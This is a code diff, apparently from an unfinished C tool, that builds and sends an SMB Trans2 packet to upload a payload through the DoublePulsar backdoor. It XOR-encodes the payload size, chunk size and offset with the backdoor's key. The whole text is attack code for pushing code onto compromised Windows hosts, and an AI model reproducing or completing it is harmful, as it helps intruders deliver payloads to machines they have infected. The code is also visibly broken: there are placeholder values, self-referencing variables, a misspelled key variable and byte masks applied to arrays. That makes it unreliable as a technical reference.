@@ -67,54 +67,97 @@ char data[4096];
 
 int sendStuff()
 {
-      char CHAR_XOR_KEY[4]; //This is from DoublePulsar XOR key calculator; the calculated char is stored here
+	unsigned int XorKey; //unsigned integer calculated XOR key from backdoor.  extracted & calculated from SMG signature.
+      	XorKey = 0x58581162; //for testing's sake, we have used a static one for the purposes of this to compile correctly
 
-      //set data buffer to hold dummy data 
-      memset(data,0x90, 4096);
+      	char CHAR_XOR_KEY[4]; //This is from DoublePulsar XOR key calculator; the calculated char is stored here
 
-      SMB_TRANSACTION2_SECONDARY_REQUEST uploadpacket;
-      //set SMB values
-      uploadpacket.ProtocolHeader[0] = '\xff';
-      uploadpacket.ProtocolHeader[1] = 'S';
-      uploadpacket.ProtocolHeader[2] = 'M';
-      uploadpacket.ProtocolHeader[3] = 'B';
-      
-      uploadpacket.SmbCommand = 0x32; //Trans2 
-      uploadpacket.Flags = 0x18;
-      uploadpacket.Flags2 = 0xC007;
-      
-      uploadpacket.ProcessID = 0xfeff;
-      uploadpacket.signature = 0x00000000;
-      uploadpacket.TreeID = 2018; //grab from SMB response
-      uploadpacket.MultiplexID = 41; //find out the true value, should it be 41?
+      	//set data buffer to hold dummy data 
+      	memset(data,0x90, 4096);
 
-      //trans2 packet stuff
-      uploadpacket.wordCount = 14 + 1;
+      	SMB_TRANSACTION2_SECONDARY_REQUEST uploadpacket;
+      	//set SMB values
+      	uploadpacket.ProtocolHeader[0] = '\xff';
+      	uploadpacket.ProtocolHeader[1] = 'S';
+      	uploadpacket.ProtocolHeader[2] = 'M';
+      	uploadpacket.ProtocolHeader[3] = 'B';
       
-      //FIX ME
-      uploadpacket.totalParameterCount = NULL; //find out how to get this value!
-      /////////
-      uploadpacket.totalDataCount = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQ);
+      	uploadpacket.SmbCommand = 0x32; //Trans2 
+      	uploadpacket.Flags = 0x18;
+      	uploadpacket.Flags2 = 0xC007;
       
-      uploadpacket.Timeout = 0x25891a00; //find out the total timeout value, this is most likely wrong!
-      //0x866c3100 = PING command
-      
-      uploadpacket.ParamCountTotal = 1;
-      uploadpacket.DataCountTotal = 0;
-      uploadpacket.ParamCountMax = 1;
-      uploadpacket.DataCountMax = 0;
-      uploadpacket.ParamCount = __find__value__here (parameter length)
-      uploadpacket.ParamOffset = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQUEST) + (1 * 2) - 4;
-      uploadpacket.DataCount = 0;
-      uploadpacket.DataOffset = __find__value__here
-      uploadpacket.SetupCount = __find__value__here
-      uploadpacket.SetupData = __find__value__here
-      uploadpacket.function = 0x0e00;
-      uploadpacket.byteCount = 4109;
-      memcpy(uploadpacket.SESSION_DATA_PARAMETERS, "GIBERISH" , 8);
-      memcpy(uploadpacket.SESSION_DATA_PARAMETERS + 8, CHAR_XOR_KEY, 4);
-      memcpy(uploadpacket.payload, data, 4096);
+      	uploadpacket.ProcessID = 0xfeff;
+      	uploadpacket.signature = 0x00000000;
+      	uploadpacket.TreeID = 2018; //grab from SMB response
+      	uploadpacket.MultiplexID = 41; //find out the true value, should it be 41?
 
-      //send data
-      send(socket, (char*)uploadpacket,sizeof(uploadpacket),0);
+      	//trans2 packet stuff
+      	uploadpacket.wordCount = 14 + 1;
+      
+      	//FIX ME
+      	uploadpacket.totalParameterCount = NULL; //find out how to get this value!
+      	/////////
+      	uploadpacket.totalDataCount = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQ);
+      
+      	uploadpacket.Timeout = 0x25891a00; //find out the total timeout value, this is most likely wrong!
+      	//0x866c3100 = PING command
+      
+      	uploadpacket.ParamCountTotal = 1;
+      	uploadpacket.DataCountTotal = 0;
+      	uploadpacket.ParamCountMax = 1;
+      	uploadpacket.DataCountMax = 0;
+      	uploadpacket.ParamCount = __find__value__here (parameter length)
+      	uploadpacket.ParamOffset = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQUEST) + (1 * 2) - 4;
+      	uploadpacket.DataCount = 0;
+      	uploadpacket.DataOffset = __find__value__here
+      	uploadpacket.SetupCount = __find__value__here
+      	uploadpacket.SetupData = __find__value__here
+      	uploadpacket.function = 0x0e00;
+      	uploadpacket.byteCount = 4109;
+
+      	//we need to calculate the Trans2 SESSION_SETUP parameters field
+      	//12 bytes in length
+      	//1st parameter:  Total Size of Payload 
+      	//2nd paramteter: Chunk Size
+      	//3rd parameter: Offset of Chunk in Payload
+      	unsigned int TotalSizeOfPayload = SizeOfPayload ^ XorKey;
+      	unsigned int ChunkSize = ChunkSize ^ XorKey;
+      	unsigned int OffsetOfChunk = OffsetOfChunk ^ Xorkey;
+
+	unsigned char TotalSizeOfPayloadC[4];
+	unsigned char ChunkSizeC[4];
+	unsigned char OffsetOfChunkC[4];
+	
+	TotalSizeOfPayloadC[0] = TotalSizeOfPayload & 0xFF;
+	TotalSizeOfPayloadC[1] = (TotalSizeOfPayload >> 8) & 0xFF;
+	TotalSizeOfPayloadC[2] = (TotalSizeOfPayload >> 8 >> 8) & 0xFF;
+	TotalSizeOfPayloadC[3] = (TotalSizeOfPayload >> 8 >> 8 >> 8) & 0xFF;
+	
+	ChunkSizeC[0] = ChunkSize & 0xFF;
+	ChunkSizeC[1] = (ChunkSize >> 8) & 0xFF;
+	ChunkSizeC[2] = (ChunkSize >> 8 >> 8) & 0xFF;
+	ChunkSizeC[3] = (ChunkSize >> 8 >> 8 >> 8) & 0xFF;
+	
+	OffsetOfChunkC[0] = OffsetOfChunkC & 0xFF;
+	OffsetOfChunkC[1] = (OffsetOfChunkC >> 8) & 0xFF;
+	OffsetOfChunkC[2] = (OffsetOfChunkC >> 8 >> 8) & 0xFF;
+	OffsetOfChunkC[3] = (OffsetOfChunkC >> 8 >> 8 >> 8) & 0xFF;
+	
+      	uploadpacket.SESSION_DATA_PARAMETERS[0] = TotalSizeOfPayloadC[0];
+	uploadpacket.SESSION_DATA_PARAMETERS[1] = TotalSizeOfPayloadC[1];
+	uploadpacket.SESSION_DATA_PARAMETERS[2] = TotalSizeOfPayloadC[2];
+	uploadpacket.SESSION_DATA_PARAMETERS[3] = TotalSizeOfPayloadC[3];
+	uploadpacket.SESSION_DATA_PARAMETERS[4] = ChunkSizeC[0];
+	uploadpacket.SESSION_DATA_PARAMETERS[5] = ChunkSizeC[1];
+	uploadpacket.SESSION_DATA_PARAMETERS[6] = ChunkSizeC[2];
+	uploadpacket.SESSION_DATA_PARAMETERS[7] = ChunkSizeC[3];
+	uploadpacket.SESSION_DATA_PARAMETERS[8] = OffsetOfChunkC[0];
+	uploadpacket.SESSION_DATA_PARAMETERS[9] = OffsetOfChunkC[1];
+	uploadpacket.SESSION_DATA_PARAMETERS[10] = OffsetOfChunkC[2];
+	uploadpacket.SESSION_DATA_PARAMETERS[11] = OffsetOfChunkC[3];
+      
+      	memcpy(uploadpacket.payload, data, 4096);
+
+      	//send data
+      	send(socket, (char*)uploadpacket,sizeof(uploadpacket),0);
 }
